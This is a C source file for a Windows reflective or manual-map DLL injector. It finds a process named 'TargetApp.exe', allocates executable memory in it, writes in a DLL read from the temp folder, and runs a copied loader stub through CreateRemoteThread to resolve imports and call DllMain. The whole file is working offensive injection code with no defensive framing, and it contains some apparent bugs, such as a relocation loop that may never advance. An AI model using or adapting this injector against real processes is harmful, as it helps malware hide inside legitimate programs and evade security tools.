#include <stdio.h>
#include <Windows.h>
#include <TlHelp32.h>
#include "ntdll.h"
#include "err.h"
#include "main.h"

/*
 * Ref: https://github.com/INSASCLUB/Reflective-DLL-Injection/blob/master/Reflective-Injection.cpp
 */
DWORD RemoteLibraryLoader(PLOADER_PARAM pLoaderParam) {
    PIMAGE_BASE_RELOCATION pReloc = pLoaderParam->pRelocation;
    PIMAGE_IMPORT_DESCRIPTOR pImportDescriptor = pLoaderParam->pImportDescriptor;
    PBYTE pImageBase = pLoaderParam->lpImageBase;
    DWORD dwDelta = pImageBase - pLoaderParam->pNtHeader->OptionalHeader.ImageBase;

    /* Base relocation */
    while (pReloc->VirtualAddress) {
        if (pReloc->SizeOfBlock >= sizeof(PIMAGE_BASE_RELOCATION)) { // TODO: maybe wrong?
            DWORD dwCount = (pReloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
            PWORD pList = pReloc + 1;
            for (int i = 0; i < dwCount; i++) {
                if (!pList[i]) continue;
                PDWORD64 ptr = (LPBYTE)(pLoaderParam->lpImageBase) + (pReloc->VirtualAddress + (pList[i] & 0xfff));
                *ptr += dwDelta;
            }
            pReloc = (LPBYTE)(pReloc)+pReloc->SizeOfBlock;
        }
    }

    //goto fix_entry_point;
    /* IAT */
    while (pImportDescriptor->Characteristics) {
        PIMAGE_THUNK_DATA pOriginalFirstThunk = pImageBase + pImportDescriptor->OriginalFirstThunk;
        PIMAGE_THUNK_DATA pFirstThunk = pImageBase + pImportDescriptor->FirstThunk;
        HMODULE hModule = pLoaderParam->pLoadLibraryA(pImageBase + pImportDescriptor->Name);
        if (!hModule) return FALSE;

        DWORD64 dwFuncAddr;
        while (pOriginalFirstThunk->u1.AddressOfData) {
            if (pOriginalFirstThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG) {
                dwFuncAddr = pLoaderParam->pGetProcAddress(hModule, pOriginalFirstThunk->u1.Ordinal & 0xffff);
            }
            else {
                PIMAGE_IMPORT_BY_NAME pIBM = pImageBase + pOriginalFirstThunk->u1.AddressOfData;
                dwFuncAddr = pLoaderParam->pGetProcAddress(hModule, pIBM->Name);
            }
            if (!dwFuncAddr) return FALSE;
            pFirstThunk->u1.Function = dwFuncAddr;
            pOriginalFirstThunk += 1;
            pFirstThunk += 1;
        }
        pImportDescriptor += 1;
    }

fix_entry_point:
    /* Entry point */
    if (pLoaderParam->pNtHeader->OptionalHeader.AddressOfEntryPoint) {
        _DllMain pDllMain = (LPBYTE)(pLoaderParam->lpImageBase) + pLoaderParam->pNtHeader->OptionalHeader.AddressOfEntryPoint;
        return pDllMain((HMODULE)pLoaderParam->lpImageBase, DLL_PROCESS_ATTACH, NULL);
    }
    return TRUE;
}

//VOID RemoteLibraryLoader_END() {};

INT GetPidByName(WCHAR* wcProcName) {
    HANDLE hSnapshot;
    PROCESSENTRY32 pe;
    INT dwPid = -1;
    BOOL hResult;

    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == -1) ERR("CreateToolhelp32Snapshot");

    pe.dwSize = sizeof(PROCESSENTRY32);

    hResult = Process32First(hSnapshot, &pe);

    while (hResult) {
        if (wcscmp(wcProcName, pe.szExeFile) == 0) {
            dwPid = pe.th32ProcessID;
            break;
        }
        hResult = Process32Next(hSnapshot, &pe);
    }

    CloseHandle(hSnapshot);
    return dwPid;
}

BYTE DllBuffer[0x40000] = { 0 };

int main() {
    BOOL bStatus;

    /* Setup dll path */
    CHAR sDllName[] = "meow_dll.dll";
    CHAR sDllPath[100];
    memset(sDllPath, 0, sizeof(sDllPath));
    GetTempPathA(100, sDllPath);
    memcpy(sDllPath + strlen(sDllPath), sDllName, strlen(sDllName));

    /* Get remote process pid */
    INT pid = GetPidByName(L"TargetApp.exe");
    if (!pid) ERR("GetPidByName");
    printf("[+] Remote pid: %d\n", pid);

    /* Get remote process handle */
    HANDLE hRemote = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hRemote) ERR("OpenProcess");

    /* Open and read dll file to buffer */
    HANDLE hFile = CreateFileA(sDllPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (!hFile) ERR("CreateFileA");
    if (!ReadFile(hFile, DllBuffer, sizeof(DllBuffer), NULL, NULL)) ERR("ReadFile");

    /* Prase DLL Header */
    PIMAGE_DOS_HEADER pDosHeader = DllBuffer;
    PIMAGE_NT_HEADERS pNtHeader = DllBuffer + pDosHeader->e_lfanew;
    IMAGE_OPTIONAL_HEADER pOptionalHeader = pNtHeader->OptionalHeader;
    IMAGE_FILE_HEADER pFileHeader = pNtHeader->FileHeader;
    PIMAGE_SECTION_HEADER pSectionHeader = pNtHeader + 1;

    PBYTE lpRemoteImage = VirtualAllocEx(hRemote, pNtHeader->OptionalHeader.ImageBase, pOptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!lpRemoteImage) ERR("VirtualAllocEx");
    printf("[+] Remote dll image address: 0x%llx (0x%llx)\n", lpRemoteImage, pOptionalHeader.SizeOfImage);

    /* Write Header to remote */
    bStatus = WriteProcessMemory(hRemote, lpRemoteImage, DllBuffer, pOptionalHeader.SizeOfHeaders, NULL);
    if (!bStatus) ERR("Write header");

    /* Write sections */
    for (int i = 0; i < pFileHeader.NumberOfSections; i++) {
        bStatus = WriteProcessMemory(hRemote, lpRemoteImage + pSectionHeader[i].VirtualAddress, DllBuffer + pSectionHeader[i].PointerToRawData, pSectionHeader[i].SizeOfRawData, NULL);
        printf("[+] Writing %s (0x%llx)\n", pSectionHeader[i].Name, pSectionHeader[i].PointerToRawData);
        if (!bStatus) puts("Write section");
    }

    /* Save some information for remote loader */
    LOADER_PARAM loaderParam;
    loaderParam.lpImageBase = lpRemoteImage;
    loaderParam.pNtHeader = lpRemoteImage + pDosHeader->e_lfanew;
    loaderParam.pRelocation = lpRemoteImage + pOptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
    loaderParam.pImportDescriptor = lpRemoteImage + pOptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
    loaderParam.pLoadLibraryA = LoadLibraryA;
    loaderParam.pGetProcAddress = GetProcAddress;

    /* Write remote library loader & loader parameter */
    PBYTE pRemoteLibraryLoader = (DWORD64)(RemoteLibraryLoader)+*((PWORD)((PBYTE)(RemoteLibraryLoader)+1)) + 5;
    //PBYTE pRemoteLibraryLoader_END = (DWORD64)(RemoteLibraryLoader_END)+*((PWORD)((PBYTE)(RemoteLibraryLoader_END)+1)) + 5;
    DWORD dwLoaderFuncSize = 0x310; //(DWORD64)pRemoteLibraryLoader_END - (DWORD64)pRemoteLibraryLoader;
    DWORD dwLoaderTotalSize = dwLoaderFuncSize + sizeof(loaderParam);
    LPVOID lpRemoteLoaderBase = VirtualAllocEx(hRemote, NULL, dwLoaderTotalSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!lpRemoteLoaderBase) ERR("VirtualAllocEx");
    printf("[+] RemoteLibraryLoader address: 0x%llx\n", pRemoteLibraryLoader);
    printf("[+] Remote loader address: 0x%llx\n", lpRemoteLoaderBase);

    bStatus = WriteProcessMemory(hRemote, lpRemoteLoaderBase, pRemoteLibraryLoader, dwLoaderFuncSize, NULL);
    if (!bStatus) ERR("Write RemoteLibraryLoader");
    bStatus = WriteProcessMemory(hRemote, ((DWORD64)lpRemoteLoaderBase) + dwLoaderFuncSize, &loaderParam, sizeof(loaderParam), NULL);
    if (!bStatus) ERR("Write loaderParam");

    HANDLE hRemoteThread = CreateRemoteThread(hRemote, NULL, 0, lpRemoteLoaderBase, ((DWORD64)lpRemoteLoaderBase) + dwLoaderFuncSize, 0, NULL);
    return 0;
}